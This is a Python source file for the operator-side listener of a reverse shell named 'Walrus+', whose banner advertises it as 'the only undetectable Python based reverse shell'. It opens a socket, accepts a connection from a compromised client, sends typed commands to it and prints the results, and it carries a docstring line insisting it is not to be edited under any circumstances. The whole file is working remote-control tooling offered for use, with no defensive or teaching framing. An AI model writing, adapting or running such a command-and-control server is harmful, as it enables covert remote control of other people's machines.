"""
This is a simple server that will listen on port and print the output of commands ran on client
**THIS IS NOT SUPPOSED TO BE EDITED UNDER ANY CIRCUMSTANCES**
"""

__version__ = "1.1.0" # major.minor.bug

import socket
import argparse
import pyfiglet
import sys
import os

class Colors():
    RED = "\033[1;31m"
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[1;34m"
    MAGENTA = "\033[1;35m"
    CYAN = "\033[1;36m"
    WHITE = "\033[1;37m"
    DARKGRAY = "\033[1;30m"
    RESET = "\033[0;0m"
    BOLD = "\033[;1m"
    PURPLE = "\033[0;35m"

clr = Colors()

parser = argparse.ArgumentParser(description="This is a simple server that will listen on port and print the output of commands ran on client")
parser.add_argument("-p", "--port", type=int, help="The port to listen on", required=False, default=25565)
parser.add_argument("-i", "--ip", type=str, help="The ip to listen on", required=False, default="localhost")
parser.add_argument("-m", "--max-connections", type=int, help="The max amount of connections to accept", required=False, default=1)
args = parser.parse_args()

os.system("clear" if os.name == "posix" else "cls")

print(pyfiglet.figlet_format("Walrus+"))
print(f"{clr.CYAN}The only {clr.BOLD}undetectable{clr.RESET}{clr.CYAN} Python Based reverse shell{clr.RESET}")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((args.ip, args.port))

while True:
    try:
        server.listen(args.max_connections)
        A, C = server.accept()
        
        if (A):
            command = input(f'{clr.CYAN}[WALRUS@{__version__}]{clr.RESET} {clr.YELLOW}>>>{clr.RESET} ')
            
            A.send(command.encode()) 
            output = A.recv(1024).decode()
            
            print(f"{clr.YELLOW}[+] OUTPUT:{clr.RESET} {output}")
    except Exception as e:
        print(f'{clr.RED}[-] {e}{clr.RESET}')
        pass
